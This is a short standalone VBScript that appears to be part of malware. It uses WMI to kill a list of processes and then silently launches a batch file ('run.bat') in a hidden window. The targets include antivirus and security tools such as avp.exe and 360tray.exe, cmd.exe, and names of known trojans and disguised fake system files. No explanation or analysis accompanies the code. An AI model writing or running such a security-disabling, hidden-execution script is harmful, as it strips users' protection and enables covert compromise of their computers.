on error resume next
set w=getobject("winmgmts:")
set p=w.execquery("select * from win32_process where name='fyso.exe' or name='jtso.exe' or name='mhso.exe' or name='qjso.exe' or name='qqso.exe' or name='wgso.exe' or name='wlso.exe' or name='wmso.exe' or name='woso.exe' or name='ztso.exe' or name='nwizAskTao' or name='N0TEPAD.EXE' or name='reper.exe' or name='system.exe' or name='tsoner.exe' or name='viewer.exe' or name='N0TEPAD.EXE' or name='rund1l32.exe' or name='startup.pif' or name='login.pif' or name='readme.scr' or name='BLwfCcj.exe' or name='avp.exe' or name='360tray.exe' or name='cmd.exe' or name='win1.exe' or name='ping.exe' or name='scvhost.exe' or name='RNMain.exe'") 
for each i in p
i.terminate 
Next
Set ws = CreateObject("Wscript.Shell")
ws.run "cmd /K run.bat",vbhide
WScript.quit